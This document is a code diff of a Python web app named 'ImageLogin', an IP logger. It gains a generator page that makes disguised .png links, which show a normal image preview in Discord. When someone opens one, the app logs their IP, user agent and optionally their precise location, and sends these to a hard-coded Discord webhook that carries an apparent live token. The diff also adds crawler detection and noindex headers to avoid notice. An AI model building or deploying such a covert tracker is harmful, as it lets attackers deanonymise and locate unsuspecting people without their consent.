@@ -8,13 +8,12 @@ import requests
 
 __app__ = "ImageLogin"
 __description__ = "IP Logger"
-__version__ = "v3.1"
+__version__ = "v4.0"
 __author__ = "YonyLogger"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1570511014602997840/f_t39gamQaalpnKTIR9Iwygm44B8NYiTgqaS8fiAOrpFKPA7YYfISV4XXv9x_SEpFZ_D",
     "image": "https://www.euroracingparts.fr/cdn/shop/articles/bmw_m3_g80_c1a6da53-fa4f-4671-b055-482c827f6ec0.jpg?crop=center&height=1200&v=1779205839&width=1200",
-    "imageArgument": True,
     "username": "YonyLogger",
     "color": 0x000000,
     "crashBrowser": False,
@@ -32,6 +31,11 @@ config = {
         "redirect": False,
         "page": "https://your-link.here",
     },
+    "presets": [
+        "https://www.euroracingparts.fr/cdn/shop/articles/bmw_m3_g80_c1a6da53-fa4f-4671-b055-482c827f6ec0.jpg?crop=center&height=1200&v=1779205839&width=1200",
+        "https://i.pinimg.com/736x/5c/1a/f3/5c1af399d53a5e21b05e8c8a325ba2c3.jpg",
+        "https://i.pinimg.com/736x/d0/5a/82/d05a827bae9d2acac3fbc73069403131.jpg",
+    ],
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
@@ -41,21 +45,83 @@ REASONS = {
     200: "OK",
     204: "No Content",
     302: "Found",
-    400: "Bad Request",
+    404: "Not Found",
     500: "Internal Server Error",
 }
 
-PAGE = """<style>
-body {{ margin: 0; padding: 0; background: #0d0d0f; }}
-div.img {{
-    background-image: url('{url}');
-    background-position: center center;
-    background-repeat: no-repeat;
-    background-size: contain;
-    width: 100vw;
-    height: 100vh;
-}}
-</style><div class="img"></div>"""
+PAGE = """<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>__TITLE__</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;padding:0;background:#0d0d0f;color:#e8e8ea;font-family:ui-monospace,Menlo,Consolas,monospace;
+display:flex;align-items:center;justify-content:center;min-height:100vh}
+.wrap{width:min(680px,92vw)}
+h1{font-size:18px;letter-spacing:.18em;text-transform:uppercase;color:#fff;margin:0 0 4px}
+p.sub{margin:0 0 22px;font-size:12px;color:#77787d;letter-spacing:.06em}
+.field{display:flex;gap:8px;margin-bottom:10px}
+input{flex:1;background:#151519;border:1px solid #2a2a31;color:#e8e8ea;padding:12px;border-radius:8px;font:inherit;font-size:13px;outline:none}
+input:focus{border-color:#c8102e}
+button{background:#c8102e;color:#fff;border:0;padding:12px 18px;border-radius:8px;font:inherit;font-size:12px;
+letter-spacing:.1em;text-transform:uppercase;cursor:pointer}
+button:hover{background:#e01436}
+button.ghost{background:#151519;border:1px solid #2a2a31;color:#aaa}
+button.ghost:hover{border-color:#c8102e;color:#fff}
+.out{display:none;margin-top:18px}
+.out.on{display:block}
+.out input{border-color:#c8102e;color:#fff}
+.presets{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.presets img{width:74px;height:52px;object-fit:cover;border-radius:6px;cursor:pointer;
+border:2px solid transparent;filter:grayscale(.6)}
+.presets img:hover{border-color:#c8102e;filter:none}
+.note{margin-top:24px;font-size:11px;color:#5d5e63;line-height:1.7}
+a{color:#c8102e;text-decoration:none}
+</style></head>
+<body><div class="wrap">
+<h1>ImageLogin</h1>
+<p class="sub">Lien .png — aperçu Discord, IP loggée au clic</p>
+<div class="field">
+<input id="src" placeholder="URL de l'image" value="__DEFAULT__">
+<button onclick="gen()">Générer</button>
+</div>
+<div class="presets">__PRESETS__</div>
+<div class="out" id="out">
+<div class="field">
+<input id="res" readonly onclick="this.select()">
+<button class="ghost" onclick="copy()">Copier</button>
+</div>
+<p class="note">Colle ce lien dans Discord. L'aperçu s'affiche normalement, l'IP tombe quand quelqu'un ouvre l'original.</p>
+</div>
+<p class="note">__AUTHOR__ · __VERSION__</p>
+</div>
+<script>
+function enc(u){return btoa(u).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"")}
+function gen(){
+  var u=document.getElementById("src").value.trim();
+  if(!u)return;
+  document.getElementById("res").value=location.origin+"/"+enc(u)+".png";
+  document.getElementById("out").classList.add("on");
+}
+function copy(){
+  var i=document.getElementById("res");
+  i.select();document.execCommand("copy");
+}
+document.querySelectorAll(".presets img").forEach(function(el){
+  el.onclick=function(){document.getElementById("src").value=el.dataset.url;gen()};
+});
+</script></body></html>"""
+
+VIEW = """<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta property="og:image" content="__URL__">
+<title>__TITLE__</title>
+<style>
+body{margin:0;padding:0;background:#0d0d0f}
+div.img{background-image:url('__URL__');background-position:center center;
+background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh}
+</style></head><body><div class="img"></div></body></html>"""
 
 LOCATION_SCRIPT = b"""<script>
 var currenturl = window.location.href;
@@ -89,6 +155,8 @@ def isBot(ip, useragent):
         return "Discord"
     if useragent.startswith("TelegramBot"):
         return "Telegram"
+    if "bot" in useragent.lower() or "crawler" in useragent.lower():
+        return "Crawler"
     return False
 
 
@@ -116,15 +184,21 @@ def clientIP(environ):
     return forwarded.split(",")[0].strip()
 
 
-def resolveImage(query):
-    if config["imageArgument"]:
-        raw = query.get("url") or query.get("id")
-        if raw:
-            try:
-                return base64.b64decode(raw.encode()).decode()
-            except (ValueError, UnicodeDecodeError):
-                pass
-    return config["image"]
+def origin(environ):
+    host = environ.get("HTTP_X_FORWARDED_HOST") or environ.get("HTTP_HOST") or "localhost"
+    proto = environ.get("HTTP_X_FORWARDED_PROTO") or "https"
+    return f"{proto}://{host}"
+
+
+def encodeToken(url):
+    return base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
+
+
+def decodeToken(token):
+    try:
+        return base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()
+    except (ValueError, UnicodeDecodeError):
+        return None
 
 
 def respond(start_response, code, content_type, body, extra=None):
@@ -133,6 +207,7 @@ def respond(start_response, code, content_type, body, extra=None):
         ("Content-Length", str(len(body))),
         ("Cache-Control", "no-store, max-age=0"),
         ("Access-Control-Allow-Origin", "*"),
+        ("X-Robots-Tag", "noindex, nofollow"),
     ]
     if extra:
         headers.extend(extra.items())
@@ -246,25 +321,53 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     return info
 
 
+def generatorPage(environ):
+    presets = "".join(
+        f'<img src="{u}" data-url="{u}" alt="">' for u in config["presets"]
+    )
+    html = (
+        PAGE
+        .replace("__TITLE__", f"{__app__} — Générateur")
+        .replace("__DEFAULT__", config["image"])
+        .replace("__PRESETS__", presets)
+        .replace("__AUTHOR__", __author__)
+        .replace("__VERSION__", __version__)
+    )
+    return html.encode()
+
+
 def app(environ, start_response):
     try:
         method = environ.get("REQUEST_METHOD", "GET")
         path = environ.get("PATH_INFO") or "/"
         query = dict(parse.parse_qsl(environ.get("QUERY_STRING") or ""))
+        name = path.strip("/")
         ip = clientIP(environ)
         useragent = environ.get("HTTP_USER_AGENT") or ""
+
+        if name in ("", "index.html"):
+            if query.get("url"):
+                target = f"{origin(environ)}/{encodeToken(query['url'])}.png"
+                return respond(start_response, 302, "text/html", b"", {"Location": target})
+            body = generatorPage(environ)
+            return respond(start_response, 204 if method == "HEAD" else 200, "text/html; charset=utf-8", b"" if method == "HEAD" else body)
+
+        if name.startswith(("favicon", "robots.txt")):
+            return respond(start_response, 204, "text/plain", b"")
+
+        token = name[:-4] if name.lower().endswith(".png") else name
+        url = decodeToken(token) or config["image"]
 
         if not ip or ip.startswith(blacklistedIPs):
             return respond(start_response, 204, "text/plain", b"")
 
-        url = resolveImage(query)
         bot = isBot(ip, useragent)
 
         if bot:
             makeReport(ip, endpoint=path, url=url)
             if config["buggedImage"]:
-                return respond(start_response, 200, "image/jpeg", LOADING)
-            return respond(start_response, 302, "image/jpeg", b"", {"Location": url})
+                return respond(start_response, 200, "image/png", LOADING)
+            return respond(start_response, 302, "image/png", b"", {"Location": url})
 
         location = None
         if query.get("g") and config["accurateLocation"]:
@@ -300,7 +403,7 @@ def app(environ, start_response):
             for key, value in replacements.items():
                 message = message.replace(key, value)
 
-        body = PAGE.format(url=url).encode()
+        body = VIEW.replace("__URL__", url).replace("__TITLE__", f"{__app__} — {__author__}").encode()
 
         if config["message"]["doMessage"]:
             body = message.encode()
@@ -312,16 +415,16 @@ def app(environ, start_response):
             body += LOCATION_SCRIPT
 
         if method == "HEAD":
-            return respond(start_response, 200, "text/html", b"")
+            return respond(start_response, 200, "text/html; charset=utf-8", b"")
 
-        return respond(start_response, 200, "text/html", body)
+        return respond(start_response, 200, "text/html; charset=utf-8", body)
 
     except Exception:
         reportError(traceback.format_exc())
         return respond(
             start_response,
             500,
-            "text/html",
+            "text/html; charset=utf-8",
             b"500 - Internal Server Error<br>Check the message sent to your Discord webhook.",
         )
 
